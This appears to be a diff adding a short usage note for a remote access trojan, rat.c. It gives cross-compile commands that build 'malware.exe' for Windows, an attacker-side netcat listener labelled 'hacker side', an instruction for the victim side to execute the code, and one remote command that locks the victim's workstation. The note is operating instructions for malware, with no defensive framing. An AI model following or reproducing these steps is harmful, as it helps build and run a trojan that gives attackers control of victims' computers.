@@ -1,0 +1,18 @@
+compile 64bit:
+    x86_64-w64-mingw32-gcc rat.c -o malware.exe  -lwsock32 -lwininet
+
+compile 32bit:
+    i686-w64-mingw32-gcc rat.c -o malware.exe -lwsock32 -lwininet
+
+hacker side:
+    nc -lvnp 80
+
+client side:
+    execute the code
+
+
+
+commands:
+
+lock:
+    rundll32.exe user32.dll,LockWorkStation
